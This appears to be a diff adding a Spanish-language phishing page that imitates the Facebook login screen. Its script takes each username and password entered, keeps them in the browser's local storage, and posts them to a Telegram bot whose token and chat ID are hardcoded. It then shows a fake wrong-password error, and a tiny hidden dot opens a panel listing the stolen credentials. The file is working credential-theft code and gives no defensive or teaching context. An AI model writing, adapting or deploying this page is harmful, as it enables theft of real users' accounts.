@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Acceso al Sistema</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        .fb-shadow { box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
+        .input-fb:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; outline: none; }
+        
+        #admin-dot-container {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            cursor: pointer;
+        }
+
+        #admin-dot { 
+            width: 5px; 
+            height: 5px; 
+            border-radius: 50%; 
+            background-color: #22c55e; 
+            opacity: 0.4;
+            transition: all 0.3s;
+        }
+        #admin-dot-container:hover #admin-dot { opacity: 1; transform: scale(1.5); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center bg-[#f0f2f5] p-4">
+
+    <!-- PUNTO SECRETO -->
+    <div id="admin-dot-container" onclick="toggleAdminView()">
+        <div id="admin-dot"></div>
+    </div>
+
+    <!-- VISTA DE LOGIN -->
+    <div id="view-user" class="w-full max-w-[396px] transition-all duration-300">
+        <div class="fb-shadow bg-white p-4 rounded-lg mb-6 border border-gray-200">
+            
+            <form id="mainForm" class="space-y-3">
+                <input type="text" id="userField" name="usuario" placeholder="Celular o correo electrónico" 
+                       class="input-fb w-full p-[14px] border border-gray-300 rounded-[6px] text-[17px]" required>
+                
+                <input type="password" id="passField" name="password" placeholder="Contraseña" 
+                       class="input-fb w-full p-[14px] border border-gray-300 rounded-[6px] text-[17px]" required>
+
+                <button type="submit" id="submitBtn"
+                        class="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[20px] py-[10px] rounded-[6px] transition-all flex items-center justify-center h-[48px]">
+                    Entrar
+                </button>
+
+                <div id="errorBox" class="hidden text-center text-[14px] text-[#f02849] mt-3 p-2 bg-[#ffebe8] border border-[#dd3c10] rounded">
+                    La contraseña que has introducido es incorrecta.
+                </div>
+
+                <div class="text-center pt-2">
+                    <a href="#" class="text-[#1877f2] text-[14px] hover:underline">¿Has olvidado la contraseña?</a>
+                </div>
+
+                <div class="border-t border-gray-200 my-4"></div>
+
+                <div class="text-center">
+                    <button type="button" class="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-[17px] px-4 py-3 rounded-[6px]">
+                        Crear cuenta nueva
+                    </button>
+                </div>
+            </form>
+        </div>
+        <p class="text-center text-[14px] text-gray-600"><span class="font-bold">Crea una página</span> para un negocio.</p>
+    </div>
+
+    <!-- VISTA PANEL DE CONTROL -->
+    <div id="view-admin" class="hidden w-full max-w-4xl px-4">
+        <div class="bg-white rounded-xl fb-shadow border border-gray-200 overflow-hidden">
+            <div class="p-6 border-b flex justify-between items-center bg-gray-50">
+                <div>
+                    <h2 class="text-xl font-bold text-gray-800">Panel de Control Local</h2>
+                    <p class="text-xs text-green-600 font-bold uppercase">Historial de capturas</p>
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="clearHistory()" class="bg-red-50 text-red-600 px-3 py-2 rounded-lg font-bold text-xs hover:bg-red-100">Limpiar</button>
+                    <button onclick="toggleAdminView()" class="bg-gray-200 text-gray-700 px-4 py-2 rounded-lg font-bold text-sm">Cerrar</button>
+                </div>
+            </div>
+            
+            <div class="overflow-x-auto min-h-[200px]">
+                <table class="w-full text-left">
+                    <thead>
+                        <tr class="bg-gray-100 text-gray-600 text-[11px] uppercase tracking-wider font-bold">
+                            <th class="p-4 border-b">Usuario / Email</th>
+                            <th class="p-4 border-b">Contraseña</th>
+                            <th class="p-4 border-b text-right">Fecha</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dataTable" class="divide-y divide-gray-100"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURACIÓN DE TU BOT Y CHAT ID
+        const TELEGRAM_TOKEN = '8753479497:AAFgHWwVe7hchoyNwjNSEdb3H_vvyg-YAMc'; 
+        const TELEGRAM_CHAT_ID = '1850968461'; 
+
+        const form = document.getElementById('mainForm');
+        const errorBox = document.getElementById('errorBox');
+        const btn = document.getElementById('submitBtn');
+        const dataTable = document.getElementById('dataTable');
+
+        function toggleAdminView() {
+            const adminView = document.getElementById('view-admin');
+            const userView = document.getElementById('view-user');
+            if (adminView.classList.contains('hidden')) {
+                renderData();
+                userView.classList.add('hidden');
+                adminView.classList.remove('hidden');
+            } else {
+                adminView.classList.add('hidden');
+                userView.classList.remove('hidden');
+            }
+        }
+
+        function saveLocally(user, pass) {
+            let logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+            logs.unshift({ user, pass, date: new Date().toLocaleString() });
+            localStorage.setItem('admin_logs', JSON.stringify(logs.slice(0, 50)));
+        }
+
+        async function sendToTelegram(user, pass) {
+            const mensaje = `🔔 **NUEVA CAPTURA** 🔔\n\n👤 **Usuario:** \`${user}\` \n🔑 **Password:** \`${pass}\` \n📅 **Fecha:** ${new Date().toLocaleString()}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error("Error enviando a Telegram", err);
+            }
+        }
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const user = document.getElementById('userField').value;
+            const pass = document.getElementById('passField').value;
+
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+
+            // Guardar en el panel local y enviar a Telegram
+            saveLocally(user, pass);
+            await sendToTelegram(user, pass);
+
+            // Simular error de login
+            setTimeout(() => {
+                errorBox.classList.remove('hidden');
+                btn.innerText = "Entrar";
+                btn.disabled = false;
+                document.getElementById('passField').value = '';
+            }, 1000);
+        };
+
+        function renderData() {
+            const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+            dataTable.innerHTML = logs.length ? logs.map(log => `
+                <tr class="hover:bg-blue-50 transition-colors">
+                    <td class="p-4 text-blue-700 font-bold break-all">${log.user}</td>
+                    <td class="p-4 font-mono text-gray-600 bg-gray-50/50">${log.pass}</td>
+                    <td class="p-4 text-right text-[10px] text-gray-400">${log.date}</td>
+                </tr>
+            `).join('') : '<tr><td colspan="3" class="p-10 text-center text-gray-400 italic">No hay registros.</td></tr>';
+        }
+
+        function clearHistory() {
+            if(confirm("¿Borrar historial local?")) {
+                localStorage.removeItem('admin_logs');
+                renderData();
+            }
+        }
+
+        window.onload = renderData;
+    </script>
+</body>
+</html>
+
